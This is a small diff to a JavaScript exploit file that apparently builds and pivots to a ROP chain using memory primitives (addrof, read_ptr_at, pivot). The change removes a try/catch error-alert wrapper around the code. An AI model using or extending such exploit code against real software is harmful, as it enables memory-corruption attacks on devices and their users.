@@ -1,4 +1,4 @@
-try{var ropchain_array = new Uint32Array(53398);
+var ropchain_array = new Uint32Array(53398);
 var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
 var ropchain_offset = 2;
 function set_gadget(val)
@@ -25010,4 +25010,3 @@ pivot(ropchain);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
 var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
-}catch(e){alert(e);}
